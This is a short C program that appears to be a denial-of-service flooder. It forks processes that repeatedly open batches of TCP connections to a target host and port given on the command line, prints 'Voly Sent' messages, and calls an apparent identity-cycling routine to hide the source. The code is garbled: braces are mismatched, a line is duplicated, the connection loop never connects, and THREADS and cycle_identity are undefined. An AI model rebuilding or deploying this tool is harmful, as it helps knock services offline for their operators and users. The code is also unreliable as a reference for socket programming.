#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <signal.h> 
#include <sys/socket.h> 
#include <arpa/inet.h>
int make_socket(char *host, char *port) { 
struct addrinfo hints, *servinfo, *p; 
int sock, r;
memset(&hints, 0, sizeof(hints));
hints.ai_family = AF_UNSPEC; 
hints.ai_socktype = SOCK_STREAM;
if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) { 
fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r)); 
exit(0); }
for(p = servinfo; p != NULL; p = p->ai_next) {
if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
{
continue; } 
if(p == NULL) {
if(servinfo)
freeaddrinfo(servinfo);
fprintf(stderr, "No connection could be made\n"); 
exit(0); }
if(servinfo)
freeaddrinfo(servinfo);
fprintf(stderr, "[Connected -> %s:%s]\n", host, port); 
return sock;}
void broke(int s) { } 
#define CONNECTIONS 8
void attack(char *host, char *port, int id) { 
int sockets[CONNECTIONS];int x, g=1, r; 
for(x=0; x!= CONNECTIONS; x++)
sockets[x] = make_socket(host, port); 
fprintf(stderr, "[%i: Voly Sent]\n", id);} 
fprintf(stderr, "[%i: Voly Sent]\n", id); 
usleep(300000);}}
int main(int argc, char **argv) {int x; 
if(argc !=3)
cycle_identity(); 
for(x=0; x != THREADS; x++) {
if(fork())
attack(argv[1], argv[2], x); 
usleep(200000); }
getc(stdin); 
return 0; }
